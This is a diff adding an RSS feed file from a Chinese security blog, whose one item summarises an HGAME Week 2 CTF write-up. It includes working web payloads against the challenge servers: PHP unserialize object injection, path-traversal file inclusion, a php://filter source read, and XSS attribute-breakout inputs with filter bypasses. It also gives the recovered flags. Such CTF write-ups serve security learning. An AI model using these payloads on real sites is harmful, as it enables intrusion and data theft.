@@ -1,0 +1,30 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>RSA on oyiadin</title>
+    <link>https://blog.b1n.top/tags/rsa/</link>
+    <description>Recent content in RSA on oyiadin</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <lastBuildDate>Mon, 19 Feb 2018 11:47:41 +0000</lastBuildDate>
+    
+	<atom:link href="https://blog.b1n.top/tags/rsa/index.xml" rel="self" type="application/rss+xml" />
+    
+    
+    <item>
+      <title>HGAME Week2 Writeup</title>
+      <link>https://blog.b1n.top/posts/writeup/hgame/week2/</link>
+      <pubDate>Mon, 19 Feb 2018 11:47:41 +0000</pubDate>
+      
+      <guid>https://blog.b1n.top/posts/writeup/hgame/week2/</guid>
+      <description>这周赶上过年，两整天做不了题，写得比较赶（现在是凌晨五点，失眠……干脆写 wp），见谅。
+{ Web } Random? [250] 根据提示，访问 /.random.php.swp 并 vim -r random.php 得到源码。以“unserialize ctf -魔术”为关键词在谷歌搜到这篇文章。知识点：PHP 的引用赋值，构造 ?emmm=O:4:&amp;quot;emmm&amp;quot;:2:{s:6:&amp;quot;public&amp;quot;;N;s:6:&amp;quot;secret&amp;quot;;R:2;} 即可得到 Flag：hgame{&amp;amp;_Is_wondeRful!@# }
+草莓社区-1 [100] 随便点一个猫片，发现地址栏为 http://118.25.18.223:10011/show_maopian.php?mao=1.jpg，文件引入很可能不带过滤，则构造 ?mao=../flag.php 可得到 flag.php 的内容 PD9waHAKCSRmbGFnPSJoZ2FtZXsjTWEwX3BpNG5faGFPX2s0bl9tYSN9IjsK，解 base64 可得 Flag：hgame{#Ma0_pi4n_haO_k4n_ma# }
+草莓社区-2 [150] 直接构造 ?mao=../flag.php 发现不返回 flag，则用 php 伪协议 php://filter/read=convert.base64-encode/resource=../flag.php 可得到数据 UEQ5d2FIQUtDU1JtYkdGblBTSm9aMkZ0WlhzaGJUUnZYM0JwTkc1ZlEyaGhUMTlvWVc5ZmEyRnVJWDBpT3dvPQ==，解两次 base64（一次是伪协议的）可得 Flag：hgame{!m4o_pi4n_ChaO_hao_kan!}
+xss-1 [100] &amp;lt;img src=&amp;ldquo;1&amp;rdquo; onerror=&amp;ldquo;alert`1`&amp;rdquo; /&amp;gt; 可得 Flag：hgame{#X5s_soo00o_e4sy#}
+知识点：括号被过滤掉时，可以用 ` 绕过。
+xss-2 [150] 第一想法是 a&amp;rdquo; autofocus onfocus=&amp;ldquo;alert`1`，没想到在火狐上不能用，换个思路：a&amp;rdquo; src=&amp;ldquo;a&amp;rdquo; onerror=&amp;ldquo;alert`1`&amp;rdquo; type=&amp;ldquo;im&amp;#97;ge 可得 Flag：hgame{#LuCkY_y0u_a1ert_l#}</description>
+    </item>
+    
+  </channel>
+</rss>
